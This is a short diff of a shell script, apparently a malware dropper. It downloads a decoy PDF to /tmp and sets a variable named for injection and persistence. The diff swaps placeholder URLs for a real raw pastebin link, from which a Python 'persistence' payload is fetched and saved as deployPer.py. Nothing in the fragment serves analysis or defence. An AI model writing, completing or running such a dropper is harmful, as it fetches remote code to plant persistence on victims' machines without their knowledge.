@@ -3,8 +3,8 @@
 pdfUrl = "GIT_PDF_URL"
 pdfOutput = "/tmp/SliBuy.pdf"
 
-kupaTroopaUrl = "GIT_INJECTION_URL"
-kupaTroopa = "/tmp/persistence.py"
+kupaTroopaUrl = "https://pastebin.com/raw/bPWB8Tu1"
+kupaTroopa = "deployPer.py"
 
 
 echo "Downloading pdf..."
